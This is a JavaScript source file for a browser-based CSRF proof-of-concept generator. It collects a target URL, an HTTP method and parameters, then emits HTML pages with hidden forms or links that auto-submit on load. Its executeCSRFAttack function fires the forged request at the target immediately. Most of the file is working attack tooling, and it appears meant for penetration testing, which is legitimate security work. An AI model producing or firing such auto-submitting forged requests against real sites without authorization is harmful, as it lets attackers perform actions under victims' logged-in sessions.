// Wait for the entire page to load to ensure all elements are available
window.onload = function() {
    console.log('Window fully loaded, initializing CSRF tool...');
    
    // Directly reference the buttons
    const addParamButton = document.getElementById('addParam');
    const generatePocButton = document.getElementById('generatePoc');
    const testNowButton = document.getElementById('testNow');
    const copyPocButton = document.getElementById('copyPoc');
    
    // Debug button existence
    console.log('Add Param button exists:', !!addParamButton);
    console.log('Generate PoC button exists:', !!generatePocButton);
    console.log('Test Now button exists:', !!testNowButton);
    console.log('Copy PoC button exists:', !!copyPocButton);
    
    if (!testNowButton) console.error('Test Now button not found!');
    
    // Set up initial remove buttons
    setupRemoveButtons();
    
    // Add Parameter button - with explicit onclick handler
    addParamButton.onclick = function() {
        console.log('Add Parameter button clicked');
        const paramRow = document.createElement('div');
        paramRow.className = 'param-row';
        paramRow.innerHTML = `
            <input type="text" class="param-name" placeholder="Parameter name">
            <input type="text" class="param-value" placeholder="Value">
            <button type="button" class="remove-param danger">Remove</button>
        `;
        document.getElementById('paramsList').appendChild(paramRow);
        
        // Set up the remove button for this new row
        setupRemoveButtons();
    };
    
    // Generate PoC button - with explicit onclick handler
    generatePocButton.onclick = function() {
        console.log('Generate PoC button clicked');
        const targetUrl = document.getElementById('targetUrl').value;
        const requestMethod = document.getElementById('requestMethod').value;
        const params = [];
        
        // Collect all parameters
        const paramRows = document.querySelectorAll('.param-row');
        console.log('Found ' + paramRows.length + ' parameter rows');
        
        paramRows.forEach(function(row) {
            const nameInput = row.querySelector('.param-name');
            const valueInput = row.querySelector('.param-value');
            
            if (nameInput && valueInput) {
                const name = nameInput.value;
                const value = valueInput.value;
                if (name) {
                    params.push({ name, value });
                }
            }
        });
        
        console.log('Collected parameters:', params);
        
        // Generate HTML for the CSRF PoC
        let pocHtml = `<!DOCTYPE html>\n<html>\n<head>\n    <title>CSRF PoC</title>\n</head>\n<body>\n`;
        pocHtml += `    <h1>CSRF Proof of Concept</h1>\n`;
        pocHtml += `    <p>This form will be automatically submitted. If it doesn't, click the button below.</p>\n`;
        
        if (requestMethod === 'GET') {
            // For GET requests, create a link
            let url = targetUrl;
            if (params.length > 0) {
                url += '?';
                const queryParams = params.map(p => `${encodeURIComponent(p.name)}=${encodeURIComponent(p.value)}`).join('&');
                url += queryParams;
            }
            pocHtml += `    <a href="${url}" id="csrfLink">Click me</a>\n`;
            pocHtml += `    <script>\n        document.getElementById('csrfLink').click();\n    <\/script>\n`;
        } else {
            // For POST and other methods, create a form
            pocHtml += `    <form id="csrfForm" action="${targetUrl}" method="${requestMethod}">\n`;
            params.forEach(param => {
                pocHtml += `        <input type="hidden" name="${param.name}" value="${param.value}">\n`;
            });
            pocHtml += `        <input type="submit" value="Submit">\n`;
            pocHtml += `    </form>\n`;
            pocHtml += `    <script>\n        document.getElementById('csrfForm').submit();\n    <\/script>\n`;
        }
        
        pocHtml += `</body>\n</html>`;
        
        // Display the generated PoC
        const pocCodeElement = document.getElementById('pocCode');
        pocCodeElement.textContent = pocHtml;
        document.getElementById('pocPreview').style.display = 'block';
        
        // Scroll to the pocPreview section
        document.getElementById('pocPreview').scrollIntoView({ behavior: 'smooth' });
    };
    
    // Test Now button - SIMPLIFIED AND FIXED VERSION
    document.getElementById('testNow').onclick = function() {
        console.log('Test Now button clicked');
        executeCSRFAttack();
    };
    
    // Function to execute the CSRF attack
    function executeCSRFAttack() {
        const targetUrl = document.getElementById('targetUrl').value;
        const requestMethod = document.getElementById('requestMethod').value;
        const params = [];
        
        // Collect all parameters
        document.querySelectorAll('.param-row').forEach(row => {
            const name = row.querySelector('.param-name').value;
            const value = row.querySelector('.param-value').value;
            if (name) {
                params.push({ name, value });
            }
        });
        
        console.log('Executing attack with parameters:', params);
        
        try {
            if (requestMethod === 'GET') {
                let url = targetUrl;
                if (params.length > 0) {
                    url += '?';
                    const queryParams = params.map(p => `${encodeURIComponent(p.name)}=${encodeURIComponent(p.value)}`).join('&');
                    url += queryParams;
                }
                console.log('Opening URL:', url);
                window.open(url, '_blank');
            } else {
                const container = document.getElementById('csrfContainer');
                container.innerHTML = '';
                
                const form = document.createElement('form');
                form.action = targetUrl;
                form.method = requestMethod;
                form.target = '_blank';
                
                params.forEach(param => {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = param.name;
                    input.value = param.value;
                    form.appendChild(input);
                });
                
                container.appendChild(form);
                console.log('Submitting form to:', targetUrl);
                form.submit();
            }
        } catch (error) {
            console.error('Error executing CSRF attack:', error);
            alert('Error executing attack: ' + error.message);
        }
    }
    
    // Also add a fallback manual submit button to the POC
    const manualTestButton = document.createElement('button');
    manualTestButton.textContent = 'Alternative: Manual Test';
    manualTestButton.style.marginTop = '10px';
    manualTestButton.onclick = executeCSRFAttack;
    document.getElementById('pocPreview').appendChild(manualTestButton);
    
    // Copy to Clipboard button
    if (copyPocButton) {
        copyPocButton.onclick = function() {
            const pocCode = document.getElementById('pocCode').textContent;
            navigator.clipboard.writeText(pocCode).then(
                function() {
                    alert('PoC code copied to clipboard!');
                }, 
                function() {
                    alert('Failed to copy code. Please select and copy manually.');
                }
            );
        };
    }
};

// Function to set up remove button event listeners
function setupRemoveButtons() {
    const removeButtons = document.querySelectorAll('.remove-param');
    console.log('Setting up ' + removeButtons.length + ' remove buttons');
    
    removeButtons.forEach(function(button) {
        // Direct onclick assignment instead of addEventListener
        button.onclick = function(e) {
            console.log('Remove button clicked');
            const row = this.closest('.param-row');
            if (row) {
                row.remove();
            } else {
                console.error('Could not find parent row to remove');
            }
        };
    });
}
